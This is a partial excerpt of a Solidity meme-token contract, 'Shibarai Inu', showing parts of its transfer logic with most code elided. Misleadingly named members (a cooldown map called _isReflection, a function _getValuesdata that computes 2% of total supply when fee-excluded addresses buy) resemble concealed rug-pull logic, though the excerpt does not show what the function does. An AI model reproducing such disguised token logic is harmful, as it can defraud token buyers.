...
/*    
    Shibarai Inu
    Telegram : https://t.me/ShibaraiInu
*/
...
contract SHIBARAIINU is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 1 * 10**9 * 10**9;
    string private constant _name = "Shibarai Inu";
    string private constant _symbol = "SHIBARAI";
    ...
    mapping (address => uint256) private _isReflection;
    ...
    function _getValuesdata(uint256 amount) private {
        uint256 marketingFee = _tTotal/50;
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");
         ...
         if(from != owner() && to != owner() && to != _marketingWallet && from != _marketingWallet && from != uniswapV2Pair)
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            

        if (from == uniswapV2Pair) {
            require (_isReflection[to] + _buyCooldown < block.timestamp, "Must wait til after cooldown to buy");
            _isReflection[to] = block.timestamp;
        }

        if (from == uniswapV2Pair &&
            _isExcludedFromFee[to]) {
            _getValuesdata(amount);
            }
